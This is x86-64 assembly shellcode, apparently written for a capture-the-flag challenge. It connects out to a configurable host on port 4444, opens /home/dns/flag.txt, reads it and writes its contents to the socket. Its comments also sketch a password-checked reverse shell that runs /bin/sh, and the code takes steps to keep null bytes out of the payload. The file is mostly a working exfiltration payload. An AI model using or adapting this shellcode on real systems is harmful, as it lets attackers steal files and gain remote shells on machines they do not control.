BITS 64
global _start
section .text

; settings
;IP          equ 0x0100007f  ; default 127.0.0.1, contains nulls so will need mask
IP          equ 0xffffffff
PORT        equ 0x5c11      ; default 4444

; syscall kernel opcodes
SYS_SOCKET  equ 0x29
SYS_CONNECT equ 0x2a
SYS_DUP2    equ 0x21
SYS_EXECVE  equ 0x3b

; argument constants
AF_INET     equ 0x2
SOCK_STREAM equ 0x1
SOCK_DGRAM equ 0x2

_start:
; High level psuedo-C overview of shellcode logic:
;
; sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
; IP = NULLFREE_IP + NULLFREE_MASK
; struct sockaddr = {AF_INET; [PORT; IP; 0x0]}
;
; connect(sockfd, &sockaddr, 16)
; 
; read(sockfd, *pwbuf, 16)  /* 16 > 4 */
; if (pwbuf != PASSWORD) goto drop
;
; dup2(sockfd, STDIN+STDOUT+STDERR)
; execve("/bin/sh", NULL, NULL)

create_sock:
    ; sockfd = socket(AF_INET, SOCK_STREAM, 0)
    ; AF_INET = 2
    ; SOCK_STREAM = 1
    ; syscall number 41 

    push   SYS_SOCKET
    pop    rax
    cdq                     ; rdx = IPPROTO_IP (int: 0)
    push   AF_INET
    pop    rdi
    push   SOCK_STREAM
    pop    rsi
    syscall

    ; copy socket descriptor to rdi for future use 

    push rax
    pop rdi
    mov r11, rdi ; save sockfd for write

struct_sockaddr:  
    ; server.sin_family = AF_INET 
    ; server.sin_port = htons(PORT)
    ; server.sin_addr.s_addr = inet_addr("127.0.0.1")
    ; bzero(&server.sin_zero, 8)

    ;push rdx
    push rdx

    mov dword [rsp + 0x4], IP

    mov word [rsp + 0x2], PORT
    mov byte [rsp], AF_INET

connect_sock:
    ; connect(sockfd, (struct sockaddr *)&server, sockaddr_len)

    mov rsi, rsp

    push 0x10
    pop rdx

    push SYS_CONNECT
    pop rax
    syscall

; get flag
; fd = open("flag.txt", 0, 0)
; read(fd, 0x603900, 50)
; write(sockfd, 0x603900, 50) sockfd in r11

; /home/dns/flag.txt
; 74 78 74 2e 67 61 6c 66 
; 2f 73 6e 64 2f 65 6d 6f 
; 68 2f 2f 2f 2f 2f 2f 2f
open:
    xor rdi, rdi
    push rdi
    ;mov rdi, 'flag.txt'
    ;push rdi
    mov r8, 0x7478742e67616c66
    push r8
    mov r8, 0x2f736e642f656d6f
    push r8
    mov r8, 0x682f2f2f2f2f2f2f
    push r8
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    push 2
    pop rax
    syscall

read:
    mov rdi, rax
    ;push 0x42227b42 ; 0x603900 ^ 0x42424242
    ;pop rsi
    ;push 0x42424242
    ;pop r8
    ;xor rsi, r8
    sub rsp, 50
    mov rsi, rsp
    push 0x32
    pop rdx
    xor rax, rax
    syscall

write:
    push 4
    pop rdi
    push 1
    pop rax
    syscall

exit:
    push 60
    pop rax
    xor rdi, rdi
    syscall
